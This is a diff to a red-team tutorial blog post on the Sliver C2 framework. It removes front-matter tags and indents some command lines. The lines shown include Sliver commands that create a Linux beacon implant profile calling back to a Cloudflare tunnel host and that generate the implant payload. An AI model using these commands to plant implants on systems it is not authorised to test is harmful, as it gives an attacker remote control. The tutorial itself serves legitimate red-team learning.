@@ -5,9 +5,6 @@ date: 2026-10-24
 categories:
   - red-team
   - command-and-control
-tags:
-  - sliver
-  - c2
 ---
 
 # Learn Sliver C2: A Practical Guide
@@ -60,13 +57,13 @@ For this example, I will create a **Beacon payload** using a Cloudflare Tunnel. 
 By default, Sliver generates a **session** implant. If you want to generate a session payload, simply remove the `beacon` keyword from the command.
 
 ```bash
-profiles new beacon  --http https://intend-weighted-guy-degree.trycloudflare.com --os linux beaconshell
+ profiles new beacon  --http https://intend-weighted-guy-degree.trycloudflare.com --os linux beaconshell
 ```
 
 To check whether the profile was created successfully, run:
 
 ```bash
-profiles
+ profiles
 ```
 
 You should see your new profile listed, including its implant type, platform, and C2 configuration.
@@ -74,7 +71,7 @@ You should see your new profile listed, including its implant type, platform, an
 Next, generate the payload using the profile:
 
 ```bash
-profiles generate --save /mnt/c/Users/Amir/Desktop/learn/sliver/payload beaconshell
+ profiles generate --save /mnt/c/Users/Amir/Desktop/learn/sliver/payload beaconshell
 ```
 
 Sliver will then generate the implant based on the settings defined in the `beaconshell` profile.
